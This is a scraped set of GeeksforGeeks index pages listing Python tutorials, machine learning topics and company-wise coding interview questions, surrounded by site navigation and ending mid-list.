Set-2 (Bitwise Operations on Binary Images)Image Resizing using OpenCV | PythonImage Processing in Python (Scaling, Rotating, Shifting and Edge Detection)Python | Image blurring using OpenCVErosion and Dilation of images using OpenCV in pythonPython | Thresholding techniques using OpenCV | Set-1 (Simple Thresholding)Python | Thresholding techniques using OpenCV | Set-2 (Adaptive Thresholding)Python | Thresholding techniques using OpenCV | Set-3 (Otsu Thresholding)Filter Color with OpenCVPython | Bilateral FilteringPython | Background subtraction using OpenCVPython | Play a video using OpenCVExtract images from video in PythonFace Detection using Python and OpenCV with webcamPython Seleniumexpand_moreSelenium Basics – Components, Features, Uses and LimitationsComponents of SeleniumSelenium Python Introduction and InstallationNavigating links using get method – Selenium PythonInteracting with Webpage – Selenium PythonLocating single elements in Selenium PythonLocating multiple elements in Selenium PythonLocator Strategies – Selenium PythonAction Chains in Selenium PythonExceptions – Selenium PythonPython Tkinterexpand_moreIntroduction to TkinterWhat are Widgets in Tkinter?Python | Creating a button in tkinterPython Tkinter – LabelRadioButton in Tkinter | PythonPython Tkinter – Checkbutton WidgetPython Tkinter – Canvas WidgetCombobox Widget in tkinter | PythonPython Tkinter – Entry WidgetPython Tkinter – Text WidgetPython Tkinter – MessagePython | Menu widget in TkinterPython Tkinter – SpinBoxProgressbar widget in Tkinter | PythonPython-Tkinter ScrollbarPython Tkinter – ScrolledText WidgetPython Tkinter – ListBox WidgetPython Tkinter – Frame WidgetPython Tkinter – Scale WidgetHierarchical treeview in Python GUI applicationPython-Tkinter Treeview scrollbarPython Tkinter – Toplevel WidgetPython | askopenfile() function in TkinterPython | asksaveasfile() function in TkinterPython – Tkinter askquestion DialogPython Tkinter – MessageBox WidgetPython | place() method in TkinterPython | grid() method in TkinterPython | pack() method in TkinterPython | PanedWindow Widget in TkinterPython | Binding function in TkinterPython Tkinter – Validating Entry WidgetPython Kivyexpand_moreIntroduction to Kivy ; A Cross-platform Python FrameworkPython | Add Label to a kivy windowPython | Textinput widget in kivyPython | Canvas in kivyPython | Checkbox widget in KivyPython | Dropdown list in kivyPython | Carousel Widget In KivyPython | BoxLayout widget in KivyPython | Slider widget in KivyPython | Popup widget in KivyPython | Switch widget in KivyPython | Spinner widget in kivyPython | Progress Bar widget in kivyPython | Working with buttons in KivyPython | Float Layout in KivyGridLayouts in Kivy | PythonPython | StackLayout in KivyPython| AnchorLayout in KivyPython | Relative Layout in KivyPython | PageLayout in KivyPython Examples and Quizexpand_morePython Programming ExamplesPython Multiple Choice Questions Python Programming Language Python is a high-level, general-purpose and a very popular programming language. Python programming language (latest Python 3) is being used in web development, Machine Learning applications, along with all cutting edge technology in Software Industry. Python Programming Language is very well suited for Beginners, also for experienced programmers with other programming languages like C++ and Java. This specially designed Python tutorial will help you learn Python Programming Language in most efficient way, with the topics from basics to advanced (like Web-scraping, Django, Deep-Learning, etc.) with examples. Below are some facts about Python Programming Language: Python is currently the most widely used multi-purpose, high-level programming language. Python allows programming in Object-Oriented and Procedural paradigms. Python programs generally are smaller than other programming languages like Java. Programmers have to type relatively less and indentation requirement of the language, makes them readable all the time. Python language is being used by almost all tech-giant companies like – Google, Amazon, Facebook, Instagram, Dropbox, Uber… etc. The biggest strength of Python is huge collection of standard library which can be used for the following: Machine Learning GUI Applications (like Kivy, Tkinter, PyQt etc. ) Web frameworks like Django (used by YouTube, Instagram, Dropbox) Image processing (like OpenCV, Pillow) Web scraping (like Scrapy, BeautifulSoup, Selenium) Test frameworks Multimedia Scientific computing Text processing and many more.. Recent Articles on Python ! Python Programming Examples Python Output & Multiple Choice Questions Basics, Input/Output, Data Types, Variables, Operators, Control Flow, Functions, Object Oriented Concepts, Exception Handling, Python Collections, Django Framework, Data Analysis, Numpy, Pandas, Machine Learning with Python, Python GUI, Modules in Python, Working with Database, Misc, Applications and Projects, Multiple Choice Questions Basics Python language introduction Python 3 basics Python The new generation language Important difference between python 2.x and python 3.x with example Keywords in Python | Set 1, Set 2 Namespaces and Scope in Python Statement, Indentation and Comment in Python Structuring Python Programs How to check if a string is a valid keyword in Python? How to assign values to variables in Python and other languages How to print without newline in Python? Decision making Basic calculator program using Python Python Language advantages and applications Input/Output Taking input in Python Taking input from console in Python Taking multiple inputs from user in Python Python Input Methods for Competitive Programming Vulnerability in input() function – Python 2.x Python | Output using print() function How to print without newline in Python? Python | end parameter in print() Python | sep parameter in print() Python | Output Formatting Data Types Introduction to DataTypes Strings List Tuples Sets Dictionary Arrays Variables Variables, expression condition and function Maximum possible value of an integer in python? Global and local variables in python Packing and unpacking arguments in python Type conversion in python Byte objects vs string in python Print single and multiple variable Swap variable Private variables __name__ (A Special variable) in Python Operators Basic operator in python Logical and bitwise not operator on boolean Ternary operator Division operator in python Operator Overloading in Python Any & all in python Inplace and standard operators in python Operator function in python | Set – 1 Inplace operator | Set -1 Logic Gates in Python Python | a += b is not always a = a + b Difference between == and is operator in Python Python Membership and Identity Operators | in, not in, is, is not Control Flow Loops Loops and Control Statements (continue, break and pass) in Python Looping technique in python range vs xrange on python Programs for printing pyramid technique in python Chaining comparison in python else with for switch function Using iteration in python effectively Python Itertools Python __iter__() and __next__() | Converting an object into an iterator Python | Difference between iterable and iterator Generators in python Generators expression in python Functions Functions in Python class method vs static method in Python Write an empty function in Python – pass statement Yield instead of Return Return Multiple Values Partial Functions in Python First Class functions in Python Precision Handling *args and **kwargs Python closures Function Decorators Decorators in Python Decorators with parameters in Python Memoization using decorators in Python Help function in Python Python | __import__() function Python | range() does not return an iterator Coroutine in Python Python bit functions on int (bit_length, to_bytes and from_bytes) Object Oriented Concepts Python3 Intermediate Level Topics Class, Object and Members Data Hiding and Object Printing Inheritance, examples of object, issubclass and super Polymorphism in Python Class and static variable in python Class method and static method in python Changing class members Constructors in Python Destructors in Python First class function Metaprogramming with metaclasses Class and instance attribute Reflection Garbage collection Exception Handling Exception handling User defined Exception Built-in Exception clean up action Nzec error try and except in Python Python Collections Counters OrderedDict Defaultdict ChainMap NamedTuple DeQue Heap Collections.UserDict Collections.UserList Collections.UserString Django Framework Django Tutorial Django Basics Django Introduction and Installation Django Forms Views In Django Django Models Django Templates ToDo webapp using Django Django News App Weather app using Django Data Analysis Data visualization using Bokeh Exploratory Data Analysis in Python Data visualization with different Charts in Python Data analysis and Visualization with Python Data Analysis & Visualization with Python | Set 2 Math operations for Data analysis Getting started with Jupyter Notebook | Python Numpy Python Numpy Numpy | ndarray Numpy | Array Creation Numpy | Data Type Objects Data type Object (dtype) in NumPy Numpy | Indexing Numpy | Basic Slicing and Advanced Indexing Numpy | Iterating Over Array Numpy | Binary Operations Numpy | Linear Algebra Numpy | Sorting, Searching and Counting Pandas Pandas Tutorial Python | Pandas DataFrame Creating a Pandas DataFrame Dealing with Rows and Columns in Pandas DataFrame Indexing and Selecting Data with Pandas Boolean Indexing in Pandas Conversion Functions in Pandas DataFrame Iterating over rows and columns in Pandas DataFrame Working with Missing Data in Pandas Python | Pandas Series Data analysis using Pandas Read csv using pandas.read_csv() Machine Learning with Python Machine Learning Tutorial Linear Regression Understanding Logistic Regression K means Clustering Python | Image Classification using keras creating a simple machine learning model Python | Implementation of Movie Recommender System ML | Boston Housing Kaggle Challenge with Linear Regression Cancer cell classification using Scikit-learn Saving a machine learning Model Applying Convolutional Neural Network on mnist dataset Python | NLP analysis of Restaurant reviews Learning Model Building in Scikit-learn Implementing Artificial Neural Network training process A single neuron neural network in Python Python | How and where to apply Feature Scaling? Identifying handwritten digits using Logistic Regression in PyTorch Python GUI Tkinter Tutorial Kivy Tutorial Python GUI – tkinter Simple GUI calculator using Tkinter Simple registration form using Tkinter Create a stopwatch using python Designing GUI applications Using PyQt Color game using Tkinter in Python Make Notepad using Tkinter Message Encode-Decode using Tkinter Real time currency convertor using Tkinter Modules in Python Introduction of Modules OS module Calendar Module Python Urllib Module pprint Timit function Import module Working With Database MongoDB and Python SQL using Python | Set 1 SQL using Python and SQLite | Set 2 SQL using Python | Set 3 (Handling large data) Inserting variables to database table using Python MYSQLdb Connection in Python Database management in PostgreSQL Oracle Database Connection in Python Misc 10 Essential Python Tips And Tricks For Programmers Amazing hacks of Python Input method for comptetive programming Optimization Tips for Python Code Why import star in Python is a bad idea Why is python best suited for Competitive Coding? Python trics for Competitive Coding Applications and Projects Python | Program to crawl a web page and get most frequent words Facebook login using python FB Chatting through python C/C++ code formating tool Find Live running status and PNR of any train using Railway API Fetching top news using News API Fetching text from Wikipedia’s Infobox in Python Get emotions of images using Microsoft emotion API in Python Website blocker Send SMS updates to mobile phone using python Python Desktop News Notifier in 20 lines Morse Code Translator In Python Performing Google Search using Python code Reading and generating qr code Birthday reminder application in python Program to display Astrological sign or Zodiac sign for given date of birth Track bird migration News notifier whatsapp using python Python | Automating Happy Birthday post on Facebook using Selenium Design a Keylogger in Python Python | Implementation of Movie Recommender System Recommended Python Tutorials Python Tutorial Machine Learning Tutorial Django Tutorial Pandas Tutorial OpenCV Python Tutorial Selenium Python Tutorial Python Tkinter Tutorial My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTop 10 Programming Languages to Learn in 2020 - Demand, Jobs, Career GrowthTypes of Environments in AIDesign Twitter - A System Design Interview Question Most Visited Articles Top 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python5 Common System Design Concepts for Interview PreparationMaximal independent set from a given Graph using Backtracking room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Machine Learning - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Machine Learning Machine Learning is the field of study that gives computers the capability to learn without being explicitly programmed. ML is one of the most exciting technologies that one would have ever come across. As it is evident from the name, it gives the computer that makes it more similar to humans: The ability to learn. Machine learning is actively being used today, perhaps in many more places than one would expect. Recent Articles on Machine Learning ! Introduction Data and it’s Processing Supervised Learning Unsupervised Learning Reinforcement Learning Dimensionality Reduction Natural Language Processing Neural Networks ML – Applications Miscellaneous Introduction : Getting Started with Machine Learning An Introduction to Machine Learning What is Machine Learning ? Introduction to Data in Machine Learning Demystifying Machine Learning ML – Applications Best Python libraries for Machine Learning Artificial Intelligence | An Introduction Machine Learning and Artificial Intelligence Difference between Machine learning and Artificial Intelligence Agents in Artificial Intelligence 10 Basic Machine Learning Interview Questions Data and It’s Processing: Introduction to Data in Machine Learning Understanding Data Processing Python | Create Test DataSets using Sklearn Python | Generate test datasets for Machine learning Python | Data Preprocessing in Python Data Cleansing Feature Scaling – Part 1 Feature Scaling – Part 2 Python | Label Encoding of datasets Python | One Hot Encoding of datasets Handling Imbalanced Data with SMOTE and Near Miss Algorithm in Python Supervised learning : Getting started with Classification Basic Concept of Classification Types of Regression Techniques Classification vs Regression ML | Types of Learning – Supervised Learning Multiclass classification using scikit-learn Gradient Descent : Gradient Descent algorithm and its variants Stochastic Gradient Descent (SGD) Mini-Batch Gradient Descent with Python Optimization techniques for Gradient Descent Introduction to Momentum-based Gradient Optimizer Linear Regression : Introduction to Linear Regression Gradient Descent in Linear Regression Mathematical explanation for Linear Regression working Normal Equation in Linear Regression Linear Regression (Python Implementation) Simple Linear-Regression using R Univariate Linear Regression in Python Multiple Linear Regression using Python Multiple Linear Regression using R Locally weighted Linear Regression Python | Linear Regression using sklearn Linear Regression Using Tensorflow A Practical approach to Simple Linear Regression using R Linear Regression using PyTorch Pyspark | Linear regression using Apache MLlib ML | Boston Housing Kaggle Challenge with Linear Regression Python | Implementation of Polynomial Regression Softmax Regression using TensorFlow Logistic Regression : Understanding Logistic Regression Why Logistic Regression in Classification ? Logistic Regression using Python Cost function in Logistic Regression Logistic Regression using Tensorflow Naive Bayes Classifiers Support Vector: Support Vector Machines(SVMs) in Python SVM Hyperparameter Tuning using GridSearchCV Support Vector Machines(SVMs) in R Using SVM to perform classification on a non-linear dataset Decision Tree: Decision Tree Decision Tree Regression using sklearn Decision Tree Introduction with example Decision tree implementation using Python Decision Tree in Software Engineering Random Forest: Random Forest Regression in Python Ensemble Classifier Voting Classifier using Sklearn Bagging classifier Unsupervised learning : ML | Types of Learning – Unsupervised Learning Supervised and Unsupervised learning Clustering in Machine Learning Different Types of Clustering Algorithm K means Clustering – Introduction Elbow Method for optimal value of k in KMeans ML | K-means++ Algorithm Analysis of test data using K-Means Clustering in Python Mini Batch K-means clustering algorithm Mean-Shift Clustering DBSCAN – Density based clustering Implementing DBSCAN algorithm using Sklearn Fuzzy Clustering Spectral Clustering OPTICS Clustering OPTICS Clustering Implementing using Sklearn Hierarchical clustering (Agglomerative and Divisive clustering) Implementing Agglomerative Clustering using Sklearn Gaussian Mixture Model Reinforcement Learning: Reinforcement learning Reinforcement Learning Algorithm : Python Implementation using Q-learning Introduction to Thompson Sampling Genetic Algorithm for Reinforcement Learning SARSA Reinforcement Learning Q-Learning in Python Dimensionality Reduction : Introduction to Dimensionality Reduction Introduction to Kernel PCA Principal Component Analysis(PCA) Principal Component Analysis with Python Independent Component Analysis Feature Mapping Extra Tree Classifier for Feature Selection Chi-Square Test for Feature Selection – Mathematical Explanation ML | T-distributed Stochastic Neighbor Embedding (t-SNE) Algorithm Python | How and where to apply Feature Scaling? Parameters for Feature Selection Underfitting and Overfitting in Machine Learning Natural Language Processing : Introduction to Natural Language Processing Text Preprocessing in Python | Set – 1 Text Preprocessing in Python | Set 2 Removing stop words with NLTK in Python Tokenize text using NLTK in python How tokenizing text, sentence, words works Introduction to Stemming Stemming words with NLTK Lemmatization with NLTK Lemmatization with TextBlob How to get synonyms/antonyms from NLTK WordNet in Python? Neural Networks : Introduction to Artificial Neutral Networks | Set 1 Introduction to Artificial Neural Network | Set 2 Introduction to ANN (Artificial Neural Networks) | Set 3 (Hybrid Systems) Introduction to ANN | Set 4 (Network Architectures) Activation functions Implementing Artificial Neural Network training process in Python A single neuron neural network in Python Convolutional Neural Networks Introduction to Convolution Neural Network Introduction to Pooling Layer Introduction to Padding Types of padding in convolution layer Applying Convolutional Neural Network on mnist dataset Recurrent Neural Networks Introduction to Recurrent Neural Network Recurrent Neural Networks Explanation seq2seq model Introduction to Long Short Term Memory Long Short Term Memory Networks Explanation Gated Recurrent Unit Networks(GAN) Text Generation using Gated Recurrent Unit Networks GANs – Generative Adversarial Network Introduction to Generative Adversarial Network Generative Adversarial Networks (GANs) Use Cases of Generative Adversarial Networks Building a Generative Adversarial Network using Keras Modal Collapse in GANs Introduction to Deep Q-Learning Implementing Deep Q-Learning using Tensorflow ML – Applications : Rainfall prediction using Linear regression Identifying handwritten digits using Logistic Regression in PyTorch Kaggle Breast Cancer Wisconsin Diagnosis using Logistic Regression Python | Implementation of Movie Recommender System Support Vector Machine to recognize facial features in C++ Decision Trees – Fake (Counterfeit) Coin Puzzle (12 Coin Puzzle) Credit Card Fraud Detection NLP analysis of Restaurant reviews Applying Multinomial Naive Bayes to NLP Problems Image compression using K-means clustering Deep learning | Image Caption Generation using the Avengers EndGames Characters How Does Google Use Machine Learning? How Does NASA Use Machine Learning? 5 Mind-Blowing Ways Facebook Uses Machine Learning Targeted Advertising using Machine Learning How Machine Learning Is Used by Famous Companies? Misc : Pattern Recognition | Introduction Calculate Efficiency Of Binary Classifier Logistic Regression v/s Decision Tree Classification R vs Python in Datascience Explanation of Fundamental Functions involved in A3C algorithm Differential Privacy and Deep Learning Artificial intelligence vs Machine Learning vs Deep Learning Introduction to Multi-Task Learning(MTL) for Deep Learning Top 10 Algorithms every Machine Learning Engineer should know Azure Virtual Machine for Machine Learning 30 minutes to machine learning What is AutoML in Machine Learning? Confusion Matrix in Machine Learning My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Must Do Coding Questions Company-wise - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Resume Writing For InternshipMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, …Must Do Coding Questions Company-wisePractice for cracking any coding interviewHow to begin with Competitive Programming?Top 10 Algorithms and Data Structures for Competitive ProgrammingN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Rat in a Maze | Backtracking-2Count number of ways to reach destination in a MazeCount all possible paths from top left to bottom right of a mXn matrixPrint all possible paths from top left to bottom right of a mXn matrixUnique paths in a Grid with ObstaclesUnique paths covering every non-obstacle block exactly once in a gridDepth First Search or DFS for a GraphBreadth First Search or BFS for a GraphLevel Order Binary Tree TraversalTree Traversals (Inorder, Preorder and Postorder)Inorder Tree Traversal without RecursionInorder Tree Traversal without recursion and without stack!Print Postorder traversal from given Inorder and Preorder traversalsConstruct Tree from given Inorder and Preorder traversalsConstruct a Binary Tree from Postorder and InorderWhat is Memory Leak? How can we avoid? Must Do Coding Questions Company-wise Last Updated: 28-10-2020 Topic : Google Facebook Microsoft Adobe Oracle Amazon D E Shaw MAQ Software Directi Yahoo Accolite Walmart Labs Samsung Paytm Ola Cabs Flipkart SAP Labs VMware Cisco Goldman Sachs MakeMyTrip Snapdeal Qualcomm Payu Intuit Google : Subarray with given sum Maximum Index Finding the numbers Longest valid Parentheses Jumping Numbers Connect Nodes at Same Level Count BST nodes that lie in a given range Implement LRU Cache Interleaved Strings Find triplets with zero sum Egg Dropping Puzzle Word Break Problem Check if a Binary Tree contains duplicate subtrees of size 2 or more Find largest word in dictionary by deleting some characters of given string Modular Exponentiation (Power in Modular Arithmetic) Facebook : Subarray with given sum Find all pairs with a given sum Total Decoding Messages Word Boggle Activity Selection Minimum Depth of a Binary Tree Implement strstr Multiply two strings K-Palindrome Find triplets with zero sum Largest subset whose all elements are Fibonacci numbers Look-and-Say Sequence Converting Decimal Number lying between 1 to 3999 to Roman Numerals Convert Ternary Expression to Binary Tree Maximum Rectangular Area in a Histogram Amazon : K largest elements from a big file or array Reverse a Linked List in groups of given size Implement a stack with push(), pop() and min() in O(1) time Add two numbers represented by linked lists Convert a Binary tree to DLL Stock span problem Next larger element Edit distance Maximum of all subarrays of size k Pythagorean Triplet Print a Binary Tree in Vertical Order Level order traversal Smallest window in a string containing all the characters of another string Find the number of islands Detect and Remove Loop in a Linked List Check if a binary tree is BST or not Boolean Parenthesization Arrange given numbers to form the biggest number Implement LRU Cache Maximum difference between node and its ancestor in Binary Tree Microsoft : Key Pair Is Binary Number Multiple of 3 Kadane’s Algorithm Missing number in array Majority Element Search in a Rotated Array Check for BST Finding middle element in a linked list Root to leaf path sum Reverse a linked list Remove every k’th node Merge 2 sorted linked list in reverse order Longest Even Length Substring such that Sum of First and Second Half is same k largest(or smallest) elements in an array | added Min Heap method Write an Efficient Function to Convert a Binary Tree into its Mirror Tree Determine if Two Trees are Identical Adobe : Search in a Rotated Array Subset Sum Problem Reverse words in a given string Sort an array of 0s, 1s and 2s Minimum number of jumps Check for BST Root to leaf path sum Sum Tree Finding middle element in a linked list Reverse a linked list Level order traversal in spiral form Right View of Binary Tree Remove duplicate element from sorted Linked List Merge Sort for Linked List Count set bits in an integer Oracle : 0 – 1 Knapsack Problem Search in a matrix Power of 2 Palindrome Root to leaf path sum Kadane’s Algorithm Binary Search Implement Queue using Linked List Connect Nodes at Same Level Remove loop in Linked List Implement Stack using Queues Implement Queue using Stacks Remove duplicate element from sorted Linked List Search in a row wise and column wise sorted matrix Find the first repeating element in an array of integers D E Shaw : Majority Element Search in a Rotated Array Sum of Middle Elements of two sorted arrays Non Repeating Character Kadane’s Algorithm Intersection of two sorted Linked lists Detect Loop in linked list Print all nodes that don’t have sibling Two Mirror Trees Intersection Point in Y Shapped Linked Lists Trie | (Insert and Search) Implement Queue using Stacks Implement Stack using Queues Find the number of islands Copy Set Bits in Range Directi : Maximum of all subarrays of size k Search in a matrix Word Boggle Jumping Numbers Transform String Solve the Sudoku Find Nth root of M Array Pair Sum Divisibility Problem Largest zigzag sequence Maximum Intervals Overlap Max rectangle Maximum path sum Maximize Dot Product Excel Sheet | Part – 1 Probability of Knight MAQ Software : Sort an array of 0s, 1s and 2s Permutations of a given string Rotate Array by n elements Non Repeating Character Nth Fibonacci Number Finding middle element in a linked list n’th node from end of linked list Detect Loop in linked list Implement Queue using Stacks Find Missing And Repeating Find the Closest Element in BST Check if a linked list is Circular Linked List Reverse a String Reverse words in a given string Egg Dropping Puzzle Yahoo : First non-repeating character in a stream Find median in a stream Largest prime factor Form coils in a matrix Word Boggle Largest Product Palindrome Surpasser Count Return two prime numbers Sort a stack Three way partitioning LRU Cache Serialize and Deserialize a Binary Tree Split a Circular Linked List into two halves Interleaved Strings Max Sum without Adjacents Accolite : Count Squares Longest Prefix Suffix N-Queen Problem Coin Change Permutations of a given string Stock buy and sell Longest Palindrome in a String Sum of two numbers represented as arrays Max sum submatrix Maximum sum Rectangle Root to leaf path sum Lowest Common Ancestor in a Binary Tree Level order traversal in spiral form Implement Stack using Queues n’th node from end of linked list Walmart Labs : Longest consecutive subsequence Largest number in K swaps k largest elements Word Break Find the highest occurring digit in prime numbers in a range Count all possible paths from top left to bottom right Minimum Platforms Parenthesis Checker Implement LRU Cache Josephus Problem Top View of Binary Tree Intersection of Two Linked Lists Alien Dictionary Remove Loop in Linked List Wildcard Pattern Matching Samsung : Longest Increasing Subsequence Next larger element Permutations of a given string Next greater number set digits Finding middle element in a linked list Root to leaf path sum Detect Loop in linked list Left View of Binary Tree Implement Queue using Linked List Egg Dropping Puzzle Total number of possible Binary Search Trees with n keys Count number of bits to be flipped to convert A to B Implement two stacks in an array Given only a pointer/reference to a node to be deleted in a singly linked list, how do you delete it? Paytm : Sort an array of 0s, 1s and 2s Reverse words in a given string Reverse a linked list Reverse a Linked List in groups of given size Max Sum without Adjacents Mirror Tree Flattening a Linked List Check for Balanced Tree Find the number of islands Coin Change Count frequencies of all elements in array in O(1) extra space and O(n) time Convert array into Zig-Zag fashion Find the row with maximum number of 1s Maximum Rectangular Area in a Histogram Ola Cabs : Kadane’s Algorithm Missing number in array Sort an array of 0s, 1s and 2s Search in a matrix Left View of Binary Tree Mirror Tree Connect Nodes at Same Level K distance from root Level order traversal in spiral form Non Repeating Character Find the number of islands Find the character in first string that is present at minimum index in second string Maximum difference between two elements such that larger element appears after the smaller number Find the element that appears once in sorted array Boolean Matrix Problem Flipkart : Kadane’s Algorithm 0 – 1 Knapsack Problem Inversion of array Consecutive 1’s not allowed Finding middle element in a linked list Get minimum element from stack Left View of Binary Tree Add two numbers represented by linked lists Connect Nodes at Same Level Sum of dependencies in a graph Maximum of all subarrays of size k Possible words from Phone digits Reverse Level 